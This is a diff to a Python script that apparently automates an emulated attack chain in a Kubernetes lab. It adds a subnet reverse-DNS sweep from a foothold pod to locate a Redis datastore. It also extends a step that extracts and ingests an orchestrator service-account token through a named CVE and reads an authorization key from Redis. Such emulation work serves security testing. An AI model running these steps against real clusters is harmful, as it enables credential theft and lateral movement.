@@ -112,8 +112,11 @@ def ctrl_sa_id():
 
 
 def redis_pod_id():
-    return find_node(lambda n: "pod" in (n.get("kind") or "").lower()
-                     and "/oopservability/" in n["id"] and "redis" in n["id"])
+    _, ip = sh("kubectl -n oopservability get pod -l app.kubernetes.io/name=oopservability-redis "
+               "-o jsonpath='{.items[0].status.podIP}'")
+    dashed = ip.strip().replace(".", "-")
+    return find_node(lambda n: n.get("kind") == "Pod" and "/oopservability/" in n["id"]
+                     and (("redis" in n["id"]) or (dashed and dashed in n["id"])))
 
 
 def redis_sa_id():
@@ -599,7 +602,19 @@ def step_graft_arm(ctx):
 def step_graft_extract(ctx):
     """unit-5b: extract & INGEST the agent-orchestrator token via CVE-2026-47701.
     rawServiceaccountToken registers it as an auth identity, so orchestrator_identity()
-    (unchanged) now resolves an INGESTED, auth-capable node for 18-20."""
+    (unchanged) now resolves an INGESTED, auth-capable node for 18-20. The
+    reverse-dns-scan armory TTP (network.discovery effect) registers the datastore
+    as a placeholder Pod node so extract has a target distinct from the foothold."""
+    cidr = ctx.get("scan_cidr")
+    if not cidr:
+        _, wip = sh("kubectl -n agent-system get pod -l task=callback-1 "
+                    "--field-selector=status.phase=Running -o jsonpath='{.items[-1:].status.podIP}'")
+        wip = wip.strip()
+        cidr = ".".join(wip.split(".")[:3]) + ".0/24" if wip else None
+    if cidr and assert_foothold():
+        execute("reverse-dns-scan", pod_id("agent-system", "agent-worker"),
+                {"CIDR": cidr}, "unit-5b: sweep for the oopservability datastore pod",
+                exec_sys=exec_system())
     args = {"PORT": "6379", "REDIS_KEY": "oopservability:receiver:last-authorization"}
     ip = redis_clusterip()
     if ip:
